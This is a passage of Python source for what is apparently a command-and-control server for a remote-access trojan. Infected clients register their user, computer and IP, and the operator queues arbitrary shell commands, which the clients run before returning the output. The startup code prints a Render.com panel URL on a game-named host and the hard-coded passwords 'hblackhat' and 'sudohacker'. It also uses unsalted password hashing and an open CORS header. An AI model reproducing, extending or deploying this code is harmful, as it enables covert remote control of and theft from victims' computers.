            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['admin_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Admin password is incorrect'})
                return
            
            passwords['admin_password'] = new_password
        
        else:
            self.send_json({'success': False, 'error': 'Invalid password level'})
            return
        
        if self.save_passwords(passwords):
            self.log_security_event(f"Password changed for {level}")
            self.send_json({'success': True})
        else:
            self.send_json({'success': False, 'error': 'Failed to save new password'})

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            client_ip = self.client_address[0]
            incoming_user = data.get('user', 'Unknown')
            incoming_computer = data.get('computer', 'Unknown')
            incoming_os = data.get('os', 'Unknown')

            existing_client = None
            for cid, client_data in self.sessions.items():
                current_user = client_data.get('user', '')
                current_computer = client_data.get('computer', '')

                if (current_user == incoming_user and 
                    current_computer == incoming_computer and 
                    incoming_user != 'Unknown' and 
                    incoming_computer != 'Unknown'):
                    existing_client = cid
                    break
                
            if existing_client is None and client_id in self.sessions:
                existing_client = client_id

            if existing_client:
                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
                self.sessions[existing_client]['status'] = 'online'
                self.sessions[existing_client]['ip'] = client_ip

                if incoming_os != 'Unknown':
                    self.sessions[existing_client]['os'] = incoming_os

                print(f"✅ Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': existing_client})
            else:
                self.sessions[client_id] = {
                    'id': client_id,
                    'ip': client_ip,
                    'type': data.get('type', 'unknown'),
                    'computer': incoming_computer,
                    'os': incoming_os,
                    'user': incoming_user,
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat(),
                    'pending_command': None,
                    'last_response': None,
                    'status': 'online'
                }
                print(f"✅ New: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': client_id})
                
    def send_sessions_list(self):
        """إرسال قائمة الجلسات"""
        with self.session_lock:
            current_time = datetime.now()
            active_clients = []
            
            for client_id, client_data in list(self.sessions.items()):
                last_seen = datetime.fromisoformat(client_data['last_seen'])
                time_diff = (current_time - last_seen).total_seconds()
                
                if time_diff < 300:  # 5 دقائق
                    client_data['last_seen_seconds'] = time_diff
                    active_clients.append(client_data)
                else:
                    del self.sessions[client_id]
            
            self.send_json(active_clients)

    def handle_execute_command(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['pending_command'] = command
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.send_json({'success': True})
            else:
                self.send_json({'success': False, 'error': 'Client not found'})
    
    def handle_get_result(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            
            client_id = query.get('client', [''])[0]
            
            if client_id in self.sessions and self.sessions[client_id]['last_response']:
                result = self.sessions[client_id]['last_response']
                self.sessions[client_id]['last_response'] = None
                self.send_json({'result': result})
            else:
                self.send_json({'pending': True})
    
    def handle_client_response(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            response = data.get('response')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['last_response'] = response
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
            
            self.send_json({'success': True})

    def send_404_page(self):
        self.send_error(404, "Page not found")
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_redirect(self, location):
        """إعادة توجيه المستخدم"""
        self.send_response(302)
        self.send_header('Location', location)
        self.end_headers()
        
    def handle_logout(self, data):
        """تسجيل الخروج"""
        EnhancedRemoteControlHandler.level1_authenticated = False
        EnhancedRemoteControlHandler.level2_authenticated = False
        self.send_json({'success': True})

def cleanup_sessions():
    """تنظيف الجلسات المنتهية"""
    while True:
        try:
            current_time = datetime.now()
            with EnhancedRemoteControlHandler.session_lock:
                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 300:
                        del EnhancedRemoteControlHandler.sessions[client_id]
            time.sleep(30)
        except:
            pass

def main():
    handler = EnhancedRemoteControlHandler
    handler.init_database(handler)
    
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    
    # الحصول على البورت من متغير البيئة في Render.com
    port = int(os.environ.get('PORT', 8080))
    
    print("=" * 80)
    print(" SECURE REMOTE CONTROL SERVER - RENDER.COM")
    print("=" * 80)
    print(f"Control Panel:     https://game-python-1.onrender.com/control")
    print("Level 1 Password: hblackhat")
    print("Level 2 Password: sudohacker")
    print("Database:         remote_control.db")
    print("=" * 80)
    print(" SECURE MODE ACTIVATED - ALL IN ONE PAGE")
    print(" Multi-layer authentication system")
    print(" Real-time client monitoring")
    print("=" * 80)
    
    try:
        server = ThreadedHTTPServer(('0.0.0.0', port), EnhancedRemoteControlHandler)
        print(f" Server started on port {port}! Press Ctrl+C to stop.")
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()
